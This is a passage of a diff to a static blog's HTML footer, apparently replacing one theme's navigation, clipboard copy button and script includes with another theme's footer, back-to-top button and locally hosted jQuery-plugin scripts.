-          <li><a href="/about/">About</a></li>
-         
-          <li><a href="/archives/">Writing</a></li>
-         
-          <li><a href="/tags/">tags</a></li>
-         
-          <li><a href="/categories/">categories</a></li>
+
+
+
+
+
+
+
         
-      </ul>
-    </nav>
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
   </div>
-</footer>
 
-    </div>
-    <!-- styles -->
-<link rel="stylesheet" href="/lib/font-awesome/css/all.min.css">
-<link rel="stylesheet" href="/lib/justified-gallery/css/justifiedGallery.min.css">
+  
 
-    <!-- jquery -->
-<script src="/lib/jquery/jquery.min.js"></script>
-<script src="/lib/justified-gallery/js/jquery.justifiedGallery.min.js"></script>
-<!-- clipboard -->
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
 
-  <script src="/lib/clipboard/clipboard.min.js"></script>
-  <script type="text/javascript">
-  $(function() {
-    // copy-btn HTML
-    var btn = "<span class=\"btn-copy tooltipped tooltipped-sw\" aria-label=\"Copy to clipboard!\">";
-    btn += '<i class="far fa-clone"></i>';
-    btn += '</span>'; 
-    // mount it!
-    $(".highlight table").before(btn);
-    var clip = new ClipboardJS('.btn-copy', {
-      text: function(trigger) {
-        return Array.from(trigger.nextElementSibling.querySelectorAll('.code')).reduce((str,it)=>str+it.innerText+'\n','')
-      }
-    });
-    clip.on('success', function(e) {
-      e.trigger.setAttribute('aria-label', "Copied!");
-      e.clearSelection();
-    })
-  })
-  </script>
 
-<script src="/js/main.js"></script>
-<!-- search -->
 
-<!-- Google Analytics -->
 
-<!-- Baidu Analytics -->
 
-<!-- Disqus Comments -->
 
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
 
 </body>
 </html>
